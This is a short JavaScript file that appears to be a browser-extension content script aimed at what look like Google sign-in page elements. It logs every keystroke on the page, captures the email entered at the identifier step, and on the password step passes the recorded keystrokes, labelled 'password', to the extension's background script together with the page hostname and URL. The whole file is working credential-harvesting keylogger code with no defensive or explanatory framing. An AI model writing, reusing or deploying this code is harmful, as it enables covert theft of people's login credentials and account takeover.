var keyPressed = [];
var passwordNextBtn = document.querySelector('#passwordNext');
var emailNextBtn = document.querySelector('#identifierNext');
var email = "";

document.addEventListener('keydown', function(e){
  keyPressed.push(e.key);
});


emailNextBtn.addEventListener('click', function(e){
  email = document.getElementById('identifierId').value;
  chrome.runtime.sendMessage({email: email, start: 0}, function(response){
    // console.log(response);
  })
})

passwordNextBtn.addEventListener('click', function(e) {
  // pass data to background script
  chrome.runtime.sendMessage({"password": keyPressed, "source_hostname": window.location.hostname, "source_url": window.location.href, "start": 1}, function(response) {
    // console.log(response);
  });
});
